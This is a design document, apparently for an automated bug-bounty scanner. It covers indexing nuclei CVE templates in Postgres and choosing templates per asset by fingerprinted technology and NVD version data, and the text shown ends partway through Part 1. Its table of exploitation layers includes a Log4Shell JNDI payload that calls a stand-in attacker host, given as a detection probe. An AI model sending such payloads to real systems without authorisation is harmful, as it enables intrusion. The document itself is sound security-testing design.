# AttackBot — CVE Intelligence & Human-Like Multi-Layer Pentesting
> Comprehensive low-level design document covering CVE coverage architecture, nuclei template indexing, fingerprint-to-exploit mapping, AI-driven attack planning (ReAct loop), multi-step chain execution, and episodic memory / learning from mistakes.

---

## Part 1 — CVE Intelligence Architecture

### 1.1 The Three Exploitation Layers

There are three distinct layers to CVE-based testing. They are often conflated but must be kept architecturally separate:

| Layer | What it is | Example | Required for Bug Bounty |
|---|---|---|---|
| **Knowledge** | What the CVE describes | CVE-2021-44228 is Log4Shell, JNDI injection in Log4j 2.x | Yes |
| **Detection** | A check that confirms a target is vulnerable | Send `${jndi:ldap://attacker.com/a}` and watch for DNS callback | Yes |
| **Exploitation** | Actual impact demonstration | Achieve RCE, read sensitive files, escalate privileges | No (covered in SaaS doc) |

For bug bounty, layers 1 and 2 are everything. You prove the vulnerability exists with evidence — you don't need to pop a shell. The detection layer is where all the engineering effort belongs.

---

### 1.2 Why a Raw NVD MCP Server Is the Wrong Primary Data Source

The NVD (National Vulnerability Database) API returns CVE metadata in JSON format. What it gives you:
- CWE category (e.g. CWE-79 XSS, CWE-89 SQLi)
- CVSS score and vector string
- Affected product CPE (Common Platform Enumeration) identifiers
- Publication and modification dates
- Reference links

What it does **not** give you:
- How to detect if a target is vulnerable
- What HTTP request or payload to send
- What a positive response looks like
- Whether the vulnerability is exploitable remotely vs locally
- Whether authentication is required

The NVD MCP server is useful as a **version-filter layer** — to answer "is version X.Y.Z of product Z affected by any CVE?" — but it cannot be the primary CVE database. The primary database needs to be something that maps CVE IDs to executable detection logic.

---

### 1.3 Nuclei Templates as the Executable CVE Database

Nuclei's community template library (github.com/projectdiscovery/nuclei-templates) contains:
- 9,000+ total templates
- ~4,000+ CVE-specific templates under `cves/`
- Templates organized by year: `cves/2024/`, `cves/2023/`, etc.
- Each template is a complete, self-contained detection script

Each template YAML contains:
- `id` — the CVE identifier
- `info.name` — human-readable name
- `info.tags` — technology tags for routing
- `info.metadata.product` and `info.metadata.vendor` — for CPE matching
- `http[].raw` — the exact HTTP request(s) to send
- `http[].matchers` — what response pattern confirms vulnerability
- `http[].extractors` — how to pull useful data from the response

**The key insight:** You already run nuclei in Stage 4. The problem is not that you lack CVE coverage — it's that running all 9,000 templates against every asset is O(assets × templates), producing hours of runtime and massive noise. The solution is routing: run only the templates relevant to each asset's detected technology stack.

---

### 1.4 The Fingerprint-Then-Filter Architecture

The intelligence lives in the mapping layer between Stage 2 (Fingerprinting) and Stage 4 (Nuclei):

```
Stage 2 (Fingerprinting) produces per asset:
  asset.technology_stack = {
    "technologies": ["Apache Tomcat 9.0.45", "Java 11", "Spring Boot 2.4.1"],
    "server": "Apache-Coyote/1.1",
    "waf_detected": null,
    "title": "Login — MyApp"
  }

↓

Stage 4b (CVE Relevance Engine):
  Input:  asset.technology_stack
  Step 1: Extract product keywords → ["tomcat", "spring", "java"]
  Step 2: Query local nuclei template index → [CVE-2020-1938, CVE-2019-0232, CVE-2021-25122, ...]
  Step 3: Query NVD for version confirmation → filter to affected version range
  Step 4: Build per-asset template list → ScanContext.asset_template_map[asset_id]

↓

Stage 4 (Nuclei) — per asset, run only its template list:
  nuclei -l {single_asset} -t {template_list_for_asset} -json -silent
  Runtime: 40 targeted templates vs 9,000 generic templates
  Result: minutes per asset vs hours per asset
```

---

### 1.5 Nuclei Template Index — Full Implementation

#### 1.5.1 Index Schema (Postgres)

The index lives in Postgres (not SQLite) so it can be queried by the running service without file system access:

```sql
-- Migration: add to 003_engine or a new 003b_cve_index migration

CREATE TABLE nuclei_template_index (
    template_id         VARCHAR PRIMARY KEY,   -- e.g. "CVE-2021-44228"
    template_name       TEXT NOT NULL,
    template_path       VARCHAR NOT NULL,       -- path inside nuclei-templates dir
    severity            VARCHAR,                -- critical|high|medium|low|info
    tags                TEXT[],                 -- ["cve","rce","log4j","oast"]
    cve_ids             TEXT[],                 -- ["CVE-2021-44228"]
    product_keywords    TEXT[],                 -- ["log4j","apache","java"]
    vendor_keywords     TEXT[],                 -- ["apache"]
    affected_versions   JSONB,                  -- {"min": "2.0", "max": "2.14.1"} or null
    protocol            VARCHAR,                -- http|network|dns|file
    requires_auth       BOOLEAN DEFAULT FALSE,
    is_oob              BOOLEAN DEFAULT FALSE,  -- requires OOB (interactsh) callback
    last_indexed_at     TIMESTAMPTZ DEFAULT NOW(),
    created_at          TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX ix_template_tags     ON nuclei_template_index USING gin(tags);
CREATE INDEX ix_template_keywords ON nuclei_template_index USING gin(product_keywords);
CREATE INDEX ix_template_severity ON nuclei_template_index(severity);
CREATE INDEX ix_template_cve_ids  ON nuclei_template_index USING gin(cve_ids);
```

#### 1.5.2 Template Indexer Script

Run at Docker image build time and on a nightly schedule:

```python
# scripts/index_nuclei_templates.py
"""
Parses all nuclei template YAMLs and writes metadata to Postgres.
Run: python scripts/index_nuclei_templates.py
Requires: DATABASE_URL env var, nuclei-templates cloned to /nuclei-templates
"""

import asyncio
import glob
import json
import os
import re
from datetime import datetime, timezone

import yaml
import asyncpg


NUCLEI_TEMPLATES_DIR = os.getenv("NUCLEI_TEMPLATES_DIR", "/nuclei-templates")
DATABASE_URL = os.getenv("DATABASE_URL")

# Map raw nuclei tag strings to canonical product keyword lists
# This is the translation layer between nuclei's tagging conventions and our tech stack strings
TAG_TO_PRODUCT_KEYWORDS: dict[str, list[str]] = {
    "log4j":       ["log4j", "log4shell", "apache"],
    "tomcat":      ["tomcat", "apache tomcat", "catalina"],
    "spring":      ["spring", "spring boot", "spring framework", "java"],
    "jenkins":     ["jenkins"],
    "gitlab":      ["gitlab"],
    "confluence":  ["confluence", "atlassian"],
    "jira":        ["jira", "atlassian"],
    "wordpress":   ["wordpress", "wp"],
    "drupal":      ["drupal"],
    "nginx":       ["nginx"],
    "apache":      ["apache", "httpd"],
    "iis":         ["iis", "microsoft iis", "windows"],
    "php":         ["php"],
    "laravel":     ["laravel", "php"],
    "rails":       ["rails", "ruby on rails", "ruby"],
    "django":      ["django", "python"],
    "flask":       ["flask", "python"],
    "node":        ["node", "nodejs", "express"],
    "react":       ["react", "nextjs"],
    "elasticsearch": ["elasticsearch", "elastic"],
    "redis":       ["redis"],
    "mongodb":     ["mongodb", "mongo"],
    "mysql":       ["mysql", "mariadb"],
    "postgres":    ["postgres", "postgresql"],
    "oracle":      ["oracle"],
    "mssql":       ["mssql", "sql server", "microsoft sql"],
    "cisco":       ["cisco", "ios"],
    "f5":          ["f5", "bigip", "tmos"],
    "paloalto":    ["palo alto", "pan-os", "panorama"],
    "fortinet":    ["fortinet", "fortigate", "fortios"],
    "vmware":      ["vmware", "vcenter", "esxi"],
    "citrix":      ["citrix", "netscaler"],
    "exchange":    ["exchange", "owa", "microsoft exchange"],
    "sharepoint":  ["sharepoint", "microsoft sharepoint"],
    "grafana":     ["grafana"],
    "prometheus":  ["prometheus"],
    "kubernetes":  ["kubernetes", "k8s"],
    "docker":      ["docker"],
    "aws":         ["aws", "amazon"],
    "azure":       ["azure", "microsoft azure"],
    "gcp":         ["gcp", "google cloud"],
}


def extract_product_keywords(tags: list[str], vendor: str, product: str) -> list[str]:
    """Build a deduplicated list of product keywords from template metadata."""
    keywords = set()
    for tag in tags:
        tag_lower = tag.lower()
        if tag_lower in TAG_TO_PRODUCT_KEYWORDS:
            keywords.update(TAG_TO_PRODUCT_KEYWORDS[tag_lower])
        else:
            # Unknown tag — include it directly as a keyword
            keywords.add(tag_lower)
    if vendor:
        keywords.add(vendor.lower())
    if product:
        keywords.add(product.lower())
    return sorted(keywords)


def extract_version_range(template: dict) -> dict | None:
    """
    Attempt to extract affected version range from template metadata.
    Nuclei templates don't have a standard version range field — this is best-effort.
    """
    info = template.get("info", {})
    meta = info.get("metadata", {})
    # Some templates include shodan/fofa queries that hint at versions
    # Others have it in description text — we skip regex parsing for now
    affected = meta.get("affected-versions") or meta.get("affected_versions")
    if isinstance(affected, str):
        return {"raw": affected}
    return None


async def index_templates(conn: asyncpg.Connection) -> dict:
    stats = {"total": 0, "indexed": 0, "skipped": 0, "errors": 0}
    pattern = os.path.join(NUCLEI_TEMPLATES_DIR, "cves", "**", "*.yaml")

    for path in glob.glob(pattern, recursive=True):
        stats["total"] += 1
        try:
            with open(path, encoding="utf-8") as f:
                tmpl = yaml.safe_load(f)

            if not tmpl or not isinstance(tmpl, dict):
                stats["skipped"] += 1
                continue

            template_id = tmpl.get("id", "")
            if not template_id:
                stats["skipped"] += 1
                continue

            info = tmpl.get("info", {})
            meta = info.get("metadata", {})
            tags = info.get("tags", [])
            if isinstance(tags, str):
                tags = [t.strip() for t in tags.split(",")]

            severity = info.get("severity", "unknown").lower()
            vendor = meta.get("vendor", "")
            product = meta.get("product", "")

            # Determine if template needs OOB (interactsh) infrastructure
            template_str = str(tmpl)
            is_oob = "oast" in template_str or "interactsh" in template_str

            # Determine protocol
            protocol = "http"
            if "network" in tmpl:
                protocol = "network"
            elif "dns" in tmpl:
                protocol = "dns"

            # Build CVE ID list (usually just the template ID, but some cover multiple)
            cve_ids = [template_id] if template_id.startswith("CVE-") else []
            if meta.get("cve-id"):
                cve_ids = [meta["cve-id"]]

            product_keywords = extract_product_keywords(tags, vendor, product)
            version_range = extract_version_range(tmpl)

            await conn.execute("""
                INSERT INTO nuclei_template_index (
                    template_id, template_name, template_path, severity, tags,
                    cve_ids, product_keywords, vendor_keywords, affected_versions,
                    protocol, is_oob, last_indexed_at
                ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)
                ON CONFLICT (template_id) DO UPDATE SET
                    template_name = EXCLUDED.template_name,
                    severity = EXCLUDED.severity,
                    tags = EXCLUDED.tags,
                    product_keywords = EXCLUDED.product_keywords,
                    vendor_keywords = EXCLUDED.vendor_keywords,
                    affected_versions = EXCLUDED.affected_versions,
                    is_oob = EXCLUDED.is_oob,
                    last_indexed_at = EXCLUDED.last_indexed_at
            """,
                template_id,
                info.get("name", template_id),
                path,
                severity,
                tags,
                cve_ids,
                product_keywords,
                [vendor.lower()] if vendor else [],
                json.dumps(version_range) if version_range else None,
                protocol,
                is_oob,
                datetime.now(timezone.utc),
            )
            stats["indexed"] += 1

        except Exception as e:
            print(f"Error indexing {path}: {e}")
            stats["errors"] += 1

    return stats


async def main():
    conn = await asyncpg.connect(DATABASE_URL)
    try:
        stats = await index_templates(conn)
        print(f"Indexing complete: {stats}")
    finally:
        await conn.close()


if __name__ == "__main__":
    asyncio.run(main())
```

#### 1.5.3 Template Index Update Scheduler

Templates update frequently. Keep the index fresh with a nightly scheduler job added to the Core Engine's APScheduler:

```python
# core_engine/cve_index_scheduler.py

import asyncio
import subprocess
from backend.shared.logging import get_logger

log = get_logger(__name__)

async def update_nuclei_templates_and_reindex() -> None:
    """
    Nightly job: pull latest nuclei templates and rebuild the index.
    Runs in threadpool — subprocess calls are blocking.
    """
    loop = asyncio.get_event_loop()

    log.info("nuclei_template_update_started")

    # Step 1: Update nuclei templates
    try:
        result = await loop.run_in_executor(None, lambda: subprocess.run(
            ["nuclei", "-update-templates"],
            capture_output=True, timeout=300
        ))
        log.info("nuclei_templates_updated", returncode=result.returncode)
    except Exception as e:
        log.warning("nuclei_template_update_failed", error=str(e))
        # Non-fatal — continue with existing templates

    # Step 2: Re-run the indexer
    try:
        result = await loop.run_in_executor(None, lambda: subprocess.run(
            ["python", "scripts/index_nuclei_templates.py"],
            capture_output=True, timeout=600
        ))
        log.info("nuclei_template_reindex_complete", returncode=result.returncode)
    except Exception as e:
        log.error("nuclei_template_reindex_failed", error=str(e))

# Register in core_engine/main.py lifespan:
# scheduler.add_job(
#     update_nuclei_templates_and_reindex,
#     "cron",
#     hour=2, minute=0,   # 2am daily
#     id="nuclei_template_sync",
# )
```

---

### 1.6 CVE Relevance Engine — Full Implementation

#### 1.6.1 Technology Keyword Extractor

```python
# core_engine/cve_relevance.py

from dataclasses import dataclass, field
from sqlalchemy import text
from backend.shared.db import get_session
from backend.shared.logging import get_logger

log = get_logger(__name__)

# Canonical technology detection — maps substrings found in httpx fingerprint output
# to the product keywords we use to query the template index.
# Ordered from most specific to least specific — first match wins for primary product.
FINGERPRINT_TO_KEYWORDS: list[tuple[str, list[str]]] = [
    # Java application servers
    ("apache tomcat",       ["tomcat", "apache", "java"]),
    ("tomcat",              ["tomcat", "apache", "java"]),
    ("jboss",               ["jboss", "wildfly", "java"]),
    ("wildfly",             ["wildfly", "jboss", "java"]),
    ("weblogic",            ["weblogic", "oracle", "java"]),
    ("websphere",           ["websphere", "ibm", "java"]),
    ("glassfish",           ["glassfish", "java"]),
    ("jetty",               ["jetty", "java"]),
    # Java frameworks
    ("spring boot",         ["spring", "java"]),
    ("spring framework",    ["spring", "java"]),
    ("struts",              ["struts", "apache", "java"]),
    ("log4j",               ["log4j", "apache", "java"]),
    # PHP frameworks
    ("wordpress",           ["wordpress", "wp", "php"]),
    ("drupal",              ["drupal", "php"]),
    ("joomla",              ["joomla", "php"]),
    ("laravel",             ["laravel", "php"]),
    ("symfony",             ["symfony", "php"]),
    ("php",                 ["php"]),
    # Python frameworks
    ("django",              ["django", "python"]),
    ("flask",               ["flask", "python"]),
    ("fastapi",             ["fastapi", "python"]),
    # Ruby
    ("ruby on rails",       ["rails", "ruby"]),
    ("rails",               ["rails", "ruby"]),
    # Node.js
    ("express",             ["express", "node", "nodejs"]),
    ("nextjs",              ["nextjs", "react", "node"]),
    ("nestjs",              ["nestjs", "node"]),
    ("node",                ["node", "nodejs"]),
    # Web servers
    ("nginx",               ["nginx"]),
    ("apache",              ["apache", "httpd"]),
    ("iis",                 ["iis", "microsoft"]),
    ("lighttpd",            ["lighttpd"]),
    ("caddy",               ["caddy"]),
    # Databases (from error messages / response headers)
    ("mysql",               ["mysql", "mariadb"]),
    ("postgresql",          ["postgres", "postgresql"]),
    ("mongodb",             ["mongodb", "mongo"]),
    ("redis",               ["redis"]),
    ("elasticsearch",       ["elasticsearch", "elastic"]),
    ("oracle",              ["oracle"]),
    ("mssql",               ["mssql", "microsoft sql"]),
    # DevOps / CI
    ("jenkins",             ["jenkins"]),
    ("gitlab",              ["gitlab"]),
    ("github",              ["github"]),
    ("bitbucket",           ["bitbucket", "atlassian"]),
    ("confluence",          ["confluence", "atlassian"]),
    ("jira",                ["jira", "atlassian"]),
    ("sonarqube",           ["sonarqube"]),
    # Monitoring
    ("grafana",             ["grafana"]),
    ("kibana",              ["kibana", "elastic"]),
    ("prometheus",          ["prometheus"]),
    # Network appliances
    ("cisco",               ["cisco"]),
    ("f5",                  ["f5", "bigip"]),
    ("palo alto",           ["paloalto", "pan-os"]),
    ("fortinet",            ["fortinet", "fortigate"]),
    ("citrix",              ["citrix", "netscaler"]),
    # Cloud / container
    ("kubernetes",          ["kubernetes", "k8s"]),
    ("docker",              ["docker"]),
    ("vmware",              ["vmware", "vcenter"]),
    ("exchange",            ["exchange", "microsoft"]),
    ("sharepoint",          ["sharepoint", "microsoft"]),
]


def extract_keywords_from_fingerprint(technology_stack: dict) -> set[str]:
    """
    Given an httpx technology stack dict, produce the set of product keywords
    to use when querying the nuclei template index.
    """
    keywords: set[str] = set()
    technologies = technology_stack.get("technologies", [])
    server = technology_stack.get("server", "")
    title = technology_stack.get("title", "")

    # Combine all text sources for matching
    all_text = " ".join(
        [t.lower() for t in technologies] + [server.lower(), title.lower()]
    )

    for fingerprint, kws in FINGERPRINT_TO_KEYWORDS:
        if fingerprint in all_text:
            keywords.update(kws)

    return keywords
```

#### 1.6.2 Relevance Query

```python
@dataclass
class TemplateSelection:
    """Per-asset template selection result."""
    asset_id: str
    asset_value: str
    matched_keywords: list[str]
    template_paths: list[str]
    template_ids: list[str]
    requires_oob: bool          # any template needs interactsh
    high_severity_count: int
    selection_reason: str       # "tech_match" | "generic_fallback" | "version_match"


async def get_relevant_templates(
    asset_id: str,
    asset_value: str,
    technology_stack: dict,
    oob_available: bool = True,
) -> TemplateSelection:
    """
    Query the nuclei template index for templates relevant to this asset's tech stack.
    Falls back to generic high-severity templates if no specific match found.
    """
    keywords = list(extract_keywords_from_fingerprint(technology_stack))

    if not keywords:
        return await _generic_fallback_selection(asset_id, asset_value)

    async with get_session() as session:
        # Query templates whose product_keywords overlap with our detected keywords
        rows = await session.execute(text("""
            SELECT
                template_id,
                template_path,
                severity,
                is_oob,
                product_keywords
            FROM nuclei_template_index
            WHERE product_keywords && :keywords      -- array overlap operator
              AND protocol = 'http'                  -- HTTP only for web scanning
              AND (:oob_ok OR NOT is_oob)            -- skip OOB templates if infra not available
            ORDER BY
                CASE severity
                    WHEN 'critical' THEN 1
                    WHEN 'high'     THEN 2
                    WHEN 'medium'   THEN 3
                    WHEN 'low'      THEN 4
                    ELSE 5
                END,
                template_id
            LIMIT 200   -- safety cap — prevents running 3000 templates on a Java app
        """), {"keywords": keywords, "oob_ok": oob_available})

        rows = rows.fetchall()

    if not rows:
        log.info("no_template_match_falling_back",
                 asset=asset_value, keywords=keywords)
        return await _generic_fallback_selection(asset_id, asset_value)

    template_paths = [r[1] for r in rows]
    template_ids = [r[0] for r in rows]
    requires_oob = any(r[3] for r in rows)
    high_sev = sum(1 for r in rows if r[2] in ("critical", "high"))

    log.info("template_selection_complete",
             asset=asset_value,
             keywords=keywords,
             template_count=len(template_paths),
             high_severity_count=high_sev)

    return TemplateSelection(
        asset_id=asset_id,
        asset_value=asset_value,
        matched_keywords=keywords,
        template_paths=template_paths,
        template_ids=template_ids,
        requires_oob=requires_oob,
        high_severity_count=high_sev,
        selection_reason="tech_match",
    )


async def _generic_fallback_selection(asset_id: str, asset_value: str) -> TemplateSelection:
    """
    When no technology is fingerprinted, run a curated set of high-signal
    generic templates that apply broadly to any web application.
    """
    async with get_session() as session:
        rows = await session.execute(text("""
            SELECT template_id, template_path, is_oob
            FROM nuclei_template_index
            WHERE severity IN ('critical', 'high')
              AND protocol = 'http'
              AND NOT is_oob
              AND (
                  'exposure' = ANY(tags)
                  OR 'misconfig' = ANY(tags)
                  OR 'default-login' = ANY(tags)
                  OR 'auth-bypass' = ANY(tags)
              )
            ORDER BY template_id
            LIMIT 50
        """))
        rows = rows.fetchall()

    return TemplateSelection(
        asset_id=asset_id,
        asset_value=asset_value,
        matched_keywords=[],
        template_paths=[r[1] for r in rows],
        template_ids=[r[0] for r in rows],
        requires_oob=False,
        high_severity_count=len(rows),
        selection_reason="generic_fallback",
    )
```

#### 1.6.3 NVD Version-Aware Filtering

This runs after the keyword match to further narrow templates to only those affecting the detected version:

```python
# core_engine/nvd_version_filter.py

import httpx
from backend.shared.logging import get_logger

log = get_logger(__name__)

NVD_API_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

# Version string → (major, minor, patch) tuple for comparison
def parse_version(version_str: str) -> tuple[int, ...]:
    """Parse '9.0.45' into (9, 0, 45). Returns (0,) on parse failure."""
    try:
        parts = version_str.strip().split(".")
        return tuple(int(p) for p in parts if p.isdigit())
    except Exception:
        return (0,)


async def get_nvd_cves_for_product(
    vendor: str,
    product: str,
    version: str,
    nvd_api_key: str,
) -> list[str]:
    """
    Query NVD for CVEs affecting a specific product version.
    Returns list of CVE IDs. Rate limited to 50 req/30s without API key.
    """
    if not vendor or not product or not version:
        return []

    cpe_name = f"cpe:2.3:a:{vendor.lower()}:{product.lower()}:{version}:*:*:*:*:*:*:*"

    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            resp = await client.get(
                NVD_API_BASE,
                params={"cpeName": cpe_name, "resultsPerPage": 100},
                headers={"apiKey": nvd_api_key} if nvd_api_key else {},
            )
        if resp.status_code != 200:
            log.warning("nvd_api_error", status=resp.status_code, product=product)
            return []

        data = resp.json()
        cve_ids = [v["cve"]["id"] for v in data.get("vulnerabilities", [])]
        log.info("nvd_version_filter",
                 product=product, version=version, cve_count=len(cve_ids))
        return cve_ids

    except Exception as e:
        log.warning("nvd_query_failed", product=product, version=version, error=str(e))
        return []


async def filter_templates_by_nvd_version(
    selection: "TemplateSelection",
    vendor: str,
    product: str,
    version: str,
    nvd_api_key: str,
) -> "TemplateSelection":
    """
    Given a TemplateSelection, further filter to only templates whose CVE IDs
    are confirmed by NVD as affecting the detected product version.
    Falls back to the original selection if NVD query fails.
    """
    nvd_cves = await get_nvd_cves_for_product(vendor, product, version, nvd_api_key)

    if not nvd_cves:
        # NVD query failed or no results — keep original selection
        return selection

    nvd_cve_set = set(nvd_cves)
    filtered_paths = []
    filtered_ids = []

    for path, tid in zip(selection.template_paths, selection.template_ids):
        # Keep template if its ID is in the NVD result set,
        # OR if it's not a CVE-specific template (it applies generically)
        if tid in nvd_cve_set or not tid.startswith("CVE-"):
            filtered_paths.append(path)
            filtered_ids.append(tid)

    log.info("nvd_version_filter_applied",
             before=len(selection.template_paths),
             after=len(filtered_paths),
             product=product, version=version)

    return TemplateSelection(
        asset_id=selection.asset_id,
        asset_value=selection.asset_value,
        matched_keywords=selection.matched_keywords,
        template_paths=filtered_paths,
        template_ids=filtered_ids,
        requires_oob=any(p in selection.template_paths for p in filtered_paths
                         if selection.requires_oob),
        high_severity_count=min(selection.high_severity_count, len(filtered_paths)),
        selection_reason="version_match",
    )
```

---

### 1.7 Stage 4b Integration — ScanContext Extension

#### 1.7.1 ScanContext Extension

Add `asset_template_map` to `pipeline/context.py`:

```python
# backend/services/core_engine/pipeline/context.py  (updated)

from dataclasses import dataclass, field
from typing import Optional
from uuid import UUID
from backend.services.core_engine.cve_relevance import TemplateSelection


@dataclass
class ScopeDefinition:
    in_scope: list[str] = field(default_factory=list)
    out_of_scope: list[str] = field(default_factory=list)


@dataclass
class FeatureFlags:
    sqli: bool = False
    ssrf: bool = False
    crlf: bool = False
    browser_session: bool = False
    api_fuzzing: bool = False
    ai_hypothesis: bool = False
    cve_version_filtering: bool = True   # NEW: use NVD to narrow templates by version
    oob_available: bool = True           # NEW: whether interactsh infra is reachable


@dataclass
class AssetProfile:
    """
    Accumulated knowledge about an asset as the scan progresses.
    Updated by each stage. Used by the attack planner to reason about what to test next.
    """
    asset_id: str
    value: str                              # URL or domain
    asset_type: str                         # "subdomain" | "ip" | "url"
    http_status: int | None = None
    technology_stack: dict = field(default_factory=dict)
    waf_detected: str | None = None
    endpoint_count: int = 0
    js_asset_count: int = 0
    finding_count: int = 0
    has_login_form: bool = False
    has_api_endpoints: bool = False         # /api/, /v1/, /graphql detected
    response_to_auth_probe: str | None = None  # "401" | "403" | "redirect_to_login"
    template_selection: TemplateSelection | None = None
    tested_payloads: list[str] = field(default_factory=list)
    last_updated_at: str | None = None


@dataclass
class ScanContext:
    scan_id: str
    program_id: str
    scope: ScopeDefinition
    feature_flags: FeatureFlags
    priority: int = 1
    live_assets: list[str] = field(default_factory=list)
    js_asset_ids: list[str] = field(default_factory=list)

    # NEW: per-asset template maps populated by Stage 4b
    asset_template_map: dict[str, TemplateSelection] = field(default_factory=dict)

    # NEW: per-asset accumulated profiles for the attack planner
    asset_profiles: dict[str, AssetProfile] = field(default_factory=dict)

    # NEW: planner state
    completed_actions: list[str] = field(default_factory=list)
    planner_iteration: int = 0
```

#### 1.7.2 Stage 4b — CVE Relevance Stage

```python
# backend/services/core_engine/pipeline/cve_relevance_stage.py

import asyncio
from datetime import datetime, timezone

from backend.services.core_engine.pipeline.context import ScanContext, AssetProfile
from backend.services.core_engine.models import DiscoveredAsset
from backend.services.core_engine.cve_relevance import get_relevant_templates
from backend.services.core_engine.nvd_version_filter import filter_templates_by_nvd_version
from backend.shared.logging import get_logger

log = get_logger("core_engine.stage4b")

STAGE_NUMBER = 3.9
STAGE_NAME = "cve_relevance"


async def run(
    ctx: ScanContext,
    assets: list[DiscoveredAsset],
    config,
) -> None:
    """
    Stage 4b: For each asset, determine which nuclei templates are relevant
    based on its detected technology stack. Populates ctx.asset_template_map.
    Runs concurrently across all assets — this is a pure DB/API query stage.
    """
    started_at = datetime.now(timezone.utc)

    async def process_asset(asset: DiscoveredAsset) -> None:
        if asset.asset_id is None:
            return

        asset_id_str = str(asset.asset_id)
        tech_stack = asset.technology_stack or {}

        # Step 1: Keyword-based template selection
        selection = await get_relevant_templates(
            asset_id=asset_id_str,
            asset_value=asset.value,
            technology_stack=tech_stack,
            oob_available=ctx.feature_flags.oob_available,
        )

        # Step 2: Optionally narrow by NVD version (if flag enabled and version detected)
        if ctx.feature_flags.cve_version_filtering and asset.technology_stack:
            # Try to extract vendor/product/version from detected technologies
            for tech_string in tech_stack.get("technologies", []):
                vendor, product, version = _parse_tech_string(tech_string)
                if vendor and product and version:
                    selection = await filter_templates_by_nvd_version(
                        selection=selection,
                        vendor=vendor,
                        product=product,
                        version=version,
                        nvd_api_key=config.nvd_api_key,
                    )
                    break  # version filter once per asset on primary detected tech

        ctx.asset_template_map[asset_id_str] = selection

        # Update asset profile
        if asset_id_str not in ctx.asset_profiles:
            ctx.asset_profiles[asset_id_str] = AssetProfile(
                asset_id=asset_id_str,
                value=asset.value,
                asset_type=asset.asset_type,
                http_status=asset.http_status,
                technology_stack=tech_stack,
                waf_detected=asset.waf_detected,
                template_selection=selection,
            )
        else:
            ctx.asset_profiles[asset_id_str].template_selection = selection

    # Process all assets concurrently (each is a DB query — safe to parallelize)
    await asyncio.gather(*[process_asset(a) for a in assets], return_exceptions=True)

    total_templates = sum(
        len(s.template_paths) for s in ctx.asset_template_map.values()
    )
    log.info("cve_relevance_complete",
             scan_id=ctx.scan_id,
             assets_processed=len(assets),
             total_templates_selected=total_templates,
             duration_ms=int((datetime.now(timezone.utc) - started_at).total_seconds() * 1000))


def _parse_tech_string(tech_string: str) -> tuple[str, str, str]:
    """
    Parse strings like "Apache Tomcat 9.0.45" into (vendor, product, version).
    Returns ("", "", "") if parsing fails.
    """
    import re
    # Pattern: optional_vendor product version
    # "Apache Tomcat 9.0.45" → apache, tomcat, 9.0.45
    # "nginx/1.18.0" → "", nginx, 1.18.0
    # "PHP/8.1.2" → "", php, 8.1.2
    version_pattern = re.compile(r'(\d+\.\d+(?:\.\d+)*)')
    version_match = version_pattern.search(tech_string)
    if not version_match:
        return "", "", ""

    version = version_match.group(1)
    name_part = tech_string[:version_match.start()].strip().lower()
    name_part = name_part.rstrip("/").strip()

    parts = name_part.split()
    if len(parts) >= 2:
        return parts[0], parts[1], version
    elif len(parts) == 1:
        return "", parts[0], version
    return "", "", ""
```

#### 1.7.3 Updated Stage 4 Nuclei Scan

```python
# Updated nuclei_scan.py — uses per-asset template maps

async def run(
    ctx: ScanContext,
    assets: list[DiscoveredAsset],
    scope_filter: ScopeFilter,
    config,
) -> list[FindingCandidate]:
    """
    Stage 4: Run nuclei against all live assets using per-asset template selections
    from Stage 4b. Falls back to generic high-severity templates if no selection exists.
    Stages 4 and 5 run in parallel — this function must be self-contained.
    """
    all_findings: list[FindingCandidate] = []

    for asset in assets:
        asset_id_str = str(asset.asset_id) if asset.asset_id else None

        # Get the per-asset template selection from Stage 4b
        if asset_id_str and asset_id_str in ctx.asset_template_map:
            selection = ctx.asset_template_map[asset_id_str]
            template_paths = selection.template_paths
            log.info("nuclei_targeted_run",
                     asset=asset.value,
                     template_count=len(template_paths),
                     reason=selection.selection_reason)
        else:
            # No Stage 4b selection — use generic fallback inline
            template_paths = config.default_nuclei_templates
            log.warning("nuclei_no_template_selection",
                        asset=asset.value, fallback_count=len(template_paths))

        if not template_paths:
            continue

        findings = await _run_nuclei_for_asset(
            asset=asset,
            template_paths=template_paths,
            scope_filter=scope_filter,
            config=config,
        )
        all_findings.extend(findings)

        # Update asset profile with finding count
        if asset_id_str and asset_id_str in ctx.asset_profiles:
            ctx.asset_profiles[asset_id_str].finding_count += len(findings)

    log.info("stage4_nuclei_complete",
             scan_id=ctx.scan_id,
             total_findings=len(all_findings))
    return all_findings


async def _run_nuclei_for_asset(
    asset: DiscoveredAsset,
    template_paths: list[str],
    scope_filter: ScopeFilter,
    config,
) -> list[FindingCandidate]:
    """Run nuclei against a single asset with a specific template list."""
    import tempfile, os

    if not scope_filter.is_in_scope(asset.value):
        return []

    # Write target and template list to temp files
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
        tf.write(asset.value)
        target_file = tf.name

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
        tf.write("\n".join(template_paths))
        template_list_file = tf.name

    try:
        stdout, _ = await run_tool_communicate(
            args=[
                "nuclei",
                "-target", asset.value,
                "-tl", template_list_file,   # template list file
                "-json", "-silent",
                "-rate-limit", str(config.nuclei_rate_limit),
                "-bulk-size", str(config.nuclei_bulk_size),
                "-concurrency", str(config.nuclei_concurrency),
                "-timeout", "10",
            ],
            timeout=config.nuclei_timeout,
            label=f"nuclei[{asset.value}]",
        )
    finally:
        os.unlink(target_file)
        os.unlink(template_list_file)

    candidates = []
    for entry in parse_jsonl(stdout):
        matched_url = entry.get("matched-at") or entry.get("host", "")
        if not matched_url or not scope_filter.is_in_scope(matched_url):
            continue
        raw_severity = entry.get("info", {}).get("severity", "info")
        severity = nuclei_severity(raw_severity)
        candidates.append(FindingCandidate(
            vulnerability_type=f"nuclei_{entry.get('template-id', 'unknown').replace('-', '_')}",
            title=entry.get("info", {}).get("name", entry.get("template-id", "Unknown")),
            severity=severity,
            affected_url=matched_url,
            description=entry.get("info", {}).get("description", ""),
            source="nuclei",
            payload=entry.get("matched-at"),
            cvss_score=severity_to_cvss(severity),
            raw_output=entry,
        ))
    return candidates
```

---

### 1.8 CVEs Without Nuclei Templates

#### 1.8.1 Coverage Gap Analysis

Of ~250,000 published CVEs:
- ~4,000 have nuclei templates (the highest-value, most exploited ones)
- ~2,000 have Metasploit modules (many overlap with nuclei)
- The remaining ~244,000 either affect non-web software, require local access, are informational, or are extremely obscure

